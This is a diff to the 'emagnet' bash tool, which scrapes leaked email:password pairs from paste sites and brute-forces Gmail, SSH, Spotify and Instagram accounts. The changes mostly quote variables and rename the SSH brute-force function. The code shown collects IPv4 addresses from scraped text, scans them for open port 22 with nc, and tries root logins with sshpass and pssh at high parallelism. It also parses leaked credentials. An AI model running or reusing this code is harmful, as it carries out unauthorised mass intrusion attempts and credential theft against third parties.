@@ -714,28 +714,29 @@ rm /tmp/.emagnet-instagram-targets.txt &> /dev/null
 }
 
 emagnet_sshbruter() {
-if [[ -z $SSHPASS ]]; then
+if [[ -z "$SSHPASS" ]]; then
    echo -e "You must set a password to use during the attack"
    read -p "Enter a password or hit enter for default (Default: root) " sshpassb
    echo ""
-     if [[ -n $sshpassb ]]; then
-       sed -i '170d' $CONF
-       sed -i "170 i SSHPASS=$sshpassb" $CONF
+     if [[ -n "$sshpassb" ]]; then
+       sed -i '170d' "$CONF"
+       sed -i "170 i SSHPASS=$sshpassb" "$CONF"
      else
-       sed -i '170d' $CONF
-       sed -i "170 i SSHPASS=root" $CONF
+       sed -i '170d' "$CONF"
+       sed -i "170 i SSHPASS=root" "$CONF"
      fi
 fi
 
 SKIPLIST="^0\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.*\|^11.*"
-grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' $EMAGNETHOME/.temp\
-|awk -F':' '{print $2}'\
-|sort\
-|grep -v $SKIPLIST\
-|awk -F, '!seen[$1]++'> $SSHPORTSCAN
-if [[ $(cat $SSHPORTSCAN|wc -l) -eq "0" ]]; then
+grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETHOME/.temp" \
+|awk -F':' '{print $2}' \
+|sort \
+|grep -v "$SKIPLIST" \
+|awk -F, '!seen[$1]++' > "$HOME/.config/emagnet/tmp/.emagnet-portscanning.txt"
+if [[ $(cat "$HOME/.config/emagnet/tmp/.emagnet-portscanning.txt"|wc -l) -eq "0" ]]; then
     printf "%17s[\e[1;31m\e[5m00\e[0m\e[0m] - Ipv4 Addresses found\n"
     sleep 2
+    echo hiiiiiiiiiiiii			
 else
     clear
     banner
@@ -746,7 +747,6 @@ else
       printf "%64s\n" | tr ' ' '='
     sleep 2
 
-    # Let us portscan all targets and save áll with port 22 open in the text-file
     cat $HOME/.config/emagnet/tmp/.emagnet-portscan \
     |xargs -i -P 200 timeout 0.5 nc -zvn {} 22 2>&1 \
     |grep '\S' \
@@ -754,7 +754,6 @@ else
     |awk -F'[' '{print $2}'\
     |cut -d']' -f1 > $HOME/.config/emagnet/tmp/.emagnet-sshbruter.txt
 
-    	 # Now let us attack the targets
     	 while read sshtargets; do
      		xargs -P 1200 sshpass -f test pssh -v "-o StrictHostKeyChecking=no" -I -A -p 10 -h test -l root -i "uptime" 2>&1 \
    		|grep FAILURE
@@ -1002,9 +1001,9 @@ et=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP|tr '
 pf=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f1|uniq|grep -v '"'\|','\|'<'|tr ' ' '\n')
 pl=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" "$EMAGNETTEMP"|awk '{print $1}'|cut -d':' -f2,3|cut -d'|' -f1|awk -F, '!seen[$1]++'|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'\|'index.html'\|'alerts'|grep -v '/')
 pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|wc -l)
+
 if [[ "$et" -lt 10 ]]; then et="0$et";fi
 if [[ "$pt" -lt 10 ]]; then pt="0$pt";fi
-
 
 if [[ "$pt" -gt "00" ]] && [[ "$et" -gt "00" ]]; then
   echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found ${pt} passwords from: $EMAGNETPW/${pf##*/}"      | xargs >> "$EMAGNETLOGS/emagnet.log"
@@ -1026,15 +1025,16 @@ if [[ "$pt" -gt "00" ]] && [[ "$et" -gt "00" ]]; then
                            ${pt} - Passwords found\n
                            ${et} - Email addresses found"
                       fi
-sleep 2
-                           if [[ "$GBRUTEFORCE" = "true" ]]; then
+                           sleep 2
+
+                            if [[ "$GBRUTEFORCE" = "true" ]]; then
                                 printf "%64s \n\n" | tr ' ' '='
                                 printf "%17s";printf "BRUTE FORCING -- $(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mI\e[0;32mL\E[1;31m\e[0m") ACCOUNTS\e[0m\n\n"
                                 emagnet_gmail_bruter
                              elif [[ "$SBRUTEFORCE" = "true" ]]; then
                                 printf "%64s \n\n" | tr ' ' '='
                                 printf "%19s";printf "BRUTE FORCING -- \e[1;34mSSH\e[0m ACCOUNTS\e[0m\n\n"
-                                emagnet_ssh_bruter
+                                emagnet_sshbruter
                              elif [[ "$PBRUTEFORCE" = "true" ]]; then
                                 printf "%64s \n\n" | tr ' ' '='
                                 printf "%17s";printf "BRUTE FORCING -- \e[0;32mSPOTIFY\e[0m ACCOUNTS\e[0m\n\n"
@@ -1046,6 +1046,7 @@ sleep 2
                              else
                                sleep 0
                             fi
+
  elif [[ "$pt" = "00" ]] && [[ "$et" -gt "00" ]]; then
         cp -rn ${ef} $EMAGNETDB/ &> /dev/null
         echo -e "${el}" >> "$EMAGNETLOGS/emails-from-pastebin.txt"
@@ -1151,18 +1152,13 @@ case $1 in
                  fi
 
            elif [[ $2 = "ssh" ]]; then
-              hash "parallel" &> /dev/null
-                if [[ "$?" -ne "0" ]]; then
-                 echo -e "$basename$0: internal error -- parallel package is required to be installed.."
-                 exit 1
-                fi
               emagnet_conf
               sed -i 's/SBRUTEFORCE=false/SBRUTEFORCE=true/g' "$CONF"
               emagnet_conf
 
             if [[ $SBRUTEFORCE = "true" ]]; then
                		 emagnet_run4ever
-              		 emagnet_ssh_bruter
+              		 emagnet_sshbruter
             fi
 
            elif [[ $2 = "instagram" ]]; then
